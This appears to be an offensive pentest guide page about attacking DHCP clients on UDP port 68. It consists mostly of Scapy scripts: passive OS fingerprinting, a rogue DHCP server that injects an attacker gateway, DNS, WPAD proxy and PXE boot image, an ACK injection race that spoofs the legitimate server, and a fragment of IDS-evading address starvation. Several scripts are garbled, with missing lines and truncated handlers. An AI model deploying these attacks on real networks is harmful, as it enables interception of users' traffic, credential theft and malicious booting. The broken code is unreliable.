## Overview

Port **68 (UDP)** is the **DHCP client listener**. Every device requesting an IP address receives DHCP responses on this port. While Port 67 is the server side, Port 68 is where the **victim receives malicious configurations** — making it the **delivery endpoint** for rogue DHCP, ACK injection, option poisoning, and client-side exploitation.

::callout{icon="i-lucide-skull" color="red"}
Port 68 is where the attack **lands**. Every rogue DHCP Offer, every spoofed ACK, every injected option arrives at the client on UDP 68. Targeting this port means targeting the **client's trust** in DHCP — and clients trust DHCP implicitly with zero verification.
::

## Client Fingerprinting

Identify what OS, device type, and DHCP implementation the client runs. This determines which options the client processes and which attacks are effective.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Parameter Request List Fingerprinting"}
  ```python [dhcp_client_fingerprint.py]
  #!/usr/bin/env python3
  """
  DHCP Client Fingerprinting — identify OS/device by Parameter Request List.
  Different OSes request different DHCP options in a specific order.
  """

  from scapy.all import *
  from collections import defaultdict

  IFACE = "eth0"

  # Known fingerprints: (param_request_list) → OS
  FINGERPRINTS = {
      (1,3,6,15,26,28,51,58,59,43):         "macOS / iOS",
      (1,28,2,3,15,6,119,12,44,47,26,121):  "Windows 10/11",
      (1,28,2,3,15,6,12):                    "Windows 7/8",
      (1,3,6,15,119,252):                    "Linux (dhclient)",
      (1,3,6,15,26,28,42,121):              "Linux (NetworkManager)",
      (1,3,6,12,15,17,26,28,42):            "Android",
      (1,3,6,12,15,28,42,66,150):           "Cisco IP Phone",
      (1,3,6,15,66,67,150):                 "PXE Client",
      (1,3,6,15):                            "Embedded/IoT (minimal)",
      (1,3,6,12,15,28,40,41,42):            "ChromeOS",
  }

  clients = defaultdict(dict)

  def fingerprint(pkt):
      if not pkt.haslayer(DHCP):
          return

      msg_type = None
      param_list = None
      hostname = "unknown"
      vendor_class = ""

      for opt in pkt[DHCP].options:
          if isinstance(opt, tuple):
              if opt[0] == "message-type":
                  msg_type = opt[1]
              elif opt[0] == "param_req_list":
                  param_list = tuple(opt[1]) if isinstance(opt[1], (list, bytes)) else (opt[1],)
              elif opt[0] == "hostname":
                  hostname = opt[1].decode() if isinstance(opt[1], bytes) else opt[1]
              elif opt[0] == "vendor_class_id":
                  vendor_class = opt[1].decode() if isinstance(opt[1], bytes) else opt[1]

      if msg_type in (1, 3) and param_list:  # Discover or Request
          mac = pkt[Ether].src
          os_guess = "Unknown"

          for sig, os_name in FINGERPRINTS.items():
              if param_list[:len(sig)] == sig or sig[:len(param_list)] == param_list:
                  os_guess = os_name
                  break

          # Vendor class also helps
          if "MSFT" in vendor_class:
              os_guess = "Windows (MSFT 5.0)" if os_guess == "Unknown" else os_guess
          elif "android" in vendor_class.lower():
              os_guess = "Android"
          elif "udhcp" in vendor_class.lower():
              os_guess = "Embedded (udhcpc/BusyBox)"

          print(f"[+] {mac}  hostname={hostname:20s}  "
                f"OS={os_guess:25s}  vendor={vendor_class}")
          print(f"    params={list(param_list)}")

  print("[*] Sniffing DHCP client fingerprints on port 68...")
  print(f"{'='*80}")
  sniff(iface=IFACE, filter="udp dst port 67", prn=fingerprint, store=0)
  ```

  :::tabs-item{icon="i-lucide-terminal" label="p0f-style Fingerprint"}
  ```python [dhcp_p0f.py]
  #!/usr/bin/env python3
  """
  p0f-style passive DHCP fingerprinting.
  Creates a unique hash per client for tracking.
  """

  from scapy.all import *
  import hashlib

  IFACE = "eth0"
  seen = {}

  def dhcp_hash(pkt):
      if not pkt.haslayer(DHCP):
          return

      options_str = ""
      for opt in pkt[DHCP].options:
          if isinstance(opt, tuple):
              options_str += f"{opt[0]}:{opt[1]}|"
          elif opt == "end":
              break

      fp_hash = hashlib.md5(options_str.encode()).hexdigest()[:12]
      mac = pkt[Ether].src

      if mac not in seen or seen[mac] != fp_hash:
          seen[mac] = fp_hash
          hostname = "?"
          for opt in pkt[DHCP].options:
              if isinstance(opt, tuple) and opt[0] == "hostname":
                  hostname = opt[1].decode() if isinstance(opt[1], bytes) else opt[1]
          print(f"[+] {mac}  hash={fp_hash}  hostname={hostname}")

  print("[*] Passive DHCP client fingerprinting...")
  sniff(iface=IFACE, filter="udp dst port 67", prn=dhcp_hash, store=0)
  ```

  """
  Rogue DHCP with ALL injectable options.
  Every option is a separate attack vector delivered to port 68.
  """

  IFACE = "eth0"
  MY_IP  = "10.0.0.50"
  pool_counter = 100

  # ═══ ATTACK OPTIONS — edit these ═══
  OPTS = {
      "gateway":       MY_IP,              # MITM: all traffic through us
      "dns":           MY_IP,              # DNS hijack
      "domain":        "evil.corp",        # Domain suffix injection
      "wpad":          f"http://{MY_IP}/wpad.dat",  # Browser proxy hijack
      "netbios_ns":    MY_IP,              # NBNS poisoning
      "netbios_type":  0x02,               # Force B-node (broadcast)
      "ntp":           MY_IP,              # Time manipulation
      "tftp":          MY_IP,              # PXE boot redirect
      "bootfile":      "evil.pxe",         # Malicious boot image
      "search_domain": "evil.corp",        # DNS search suffix
      "lease":         300,                # Short lease = faster re-poison
      "mtu":           1400,               # MTU manipulation
  }

  def get_ip():
      global pool_counter
      pool_counter += 1
      return f"10.0.0.{pool_counter}"

  def build_options(msg_type):
      """Build DHCP options list — every option is an attack vector"""
      o = [
          ("message-type", msg_type),
          ("server_id", MY_IP),
          ("lease_time", OPTS["lease"]),
          ("renewal_time", OPTS["lease"] // 2),
          ("rebinding_time", int(OPTS["lease"] * 0.875)),
          ("subnet_mask", "255.255.255.0"),
          ("broadcast_address", "10.0.0.255"),
          ("router", OPTS["gateway"]),
          ("name_server", OPTS["dns"]),
          ("domain", OPTS["domain"]),
      ]

      # WPAD (Option 252) — browser proxy hijack
      if OPTS.get("wpad"):
          o.append((252, OPTS["wpad"].encode()))

      # NetBIOS (Options 44, 46) — NBNS poisoning
      if OPTS.get("netbios_ns"):
          o.append(("NetBIOS-over-TCP/IP-name-server", OPTS["netbios_ns"]))
          o.append(("NetBIOS-over-TCP/IP-node-type", OPTS["netbios_type"]))

      # NTP (Option 42) — time manipulation
      if OPTS.get("ntp"):
          o.append(("NTP-servers", OPTS["ntp"]))

      # TFTP / PXE (Options 66, 67)
      if OPTS.get("tftp"):
          o.append((66, OPTS["tftp"].encode()))
      if OPTS.get("bootfile"):
          o.append((67, OPTS["bootfile"].encode()))

      # DNS Search List (Option 119)
      if OPTS.get("search_domain"):
          o.append((119, OPTS["search_domain"].encode()))

      # MTU (Option 26) — fragmentation manipulation
      if OPTS.get("mtu"):
          o.append(("interface-mtu", OPTS["mtu"]))

      o.append("end")
      return o

  def handle(pkt):
      if not pkt.haslayer(DHCP): return
      mt = None
      for opt in pkt[DHCP].options:
          if isinstance(opt, tuple) and opt[0] == "message-type":
              mt = opt[1]

      if mt == 1:  # DISCOVER
          ip = get_ip()
          sendp(
              Ether(src=get_if_hwaddr(IFACE), dst=pkt[Ether].src) /
              IP(src=MY_IP, dst="255.255.255.255") /
              UDP(sport=67, dport=68) /

              DHCP(options=build_options("offer")),
              iface=IFACE, verbose=0)
          print(f"[OFFER] {pkt[Ether].src} → {ip}")

              iface=IFACE, verbose=0)
          print(f"[ACK]   {pkt[Ether].src} → {req_ip}  ★ MITM ACTIVE ★")

      elif mt == 8:  # INFORM — client has IP but wants config

              Ether(src=get_if_hwaddr(IFACE), dst=pkt[Ether].src) /

  print("[*] Full-option rogue DHCP on port 68")
  print(f"[*] Gateway={OPTS['gateway']} DNS={OPTS['dns']} WPAD={OPTS['wpad']}")

## DHCP ACK Injection — Race the Server

Inject a spoofed ACK that arrives at port 68 **before** the legitimate server responds.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="ACK Race Attack"}
  ```python [ack_injection.py]
  #!/usr/bin/env python3
  """
  DHCP ACK Injection — race the legitimate server.
  
  Sniff client REQUESTs (port 67) and instantly inject
  a spoofed ACK (port 68) before the real server responds.
  Speed is everything — we respond before reading the full packet.
  """

  from scapy.all import *

  IFACE       = "eth0"
  MY_IP       = "10.0.0.50"
  REAL_SERVER = "10.0.0.1"   # Spoof as the real server

  def inject(pkt):
      if not pkt.haslayer(DHCP): return

      mt = None
      req_ip = None
      srv_id = None
      for o in pkt[DHCP].options:
          if not isinstance(o, tuple): continue
          if o[0] == "message-type":    mt = o[1]
          elif o[0] == "requested_addr": req_ip = o[1]
          elif o[0] == "server_id":      srv_id = o[1]

      if mt != 3: return  # Only inject on REQUEST

      # Only inject if client is requesting from real server
      if srv_id and srv_id != REAL_SERVER:
          return

      if not req_ip:
          req_ip = pkt[BOOTP].ciaddr

      # BUILD ACK — spoofed as real server
      ack = (
          Ether(src=get_if_hwaddr(IFACE), dst=pkt[Ether].src) /
          IP(src=REAL_SERVER, dst="255.255.255.255") /
          UDP(sport=67, dport=68) /
          BOOTP(op=2, xid=pkt[BOOTP].xid, yiaddr=req_ip,
                siaddr=MY_IP, chaddr=pkt[BOOTP].chaddr) /
          DHCP(options=[
              ("message-type", "ack"),
              ("server_id", REAL_SERVER),     # Spoof as real server!
              ("lease_time", 300),
              ("subnet_mask", "255.255.255.0"),
              ("router", MY_IP),              # ← MITM
              ("name_server", MY_IP),         # ← DNS hijack
              (252, f"http://{MY_IP}/wpad.dat".encode()),
              "end"
          ])
      )

      sendp(ack, iface=IFACE, verbose=0)
      print(f"[+] ACK INJECTED → {pkt[Ether].src} ({req_ip})"
            f" — spoofed as {REAL_SERVER}")

  print("[*] ACK injection — racing legitimate server...")
  sniff(iface=IFACE, filter="udp dst port 67", prn=inject, store=0)
  ```

  # Slow starvation to avoid IDS detection
  # Most IDS threshold: >10 DISCOVERs/second from one port
  python3 -c "
  from scapy.all import *; import random, time
  for i in range(254):
      mac='02:'+':'.join(f'{random.randint(0,255):02x}' for _ in range(5))

  "
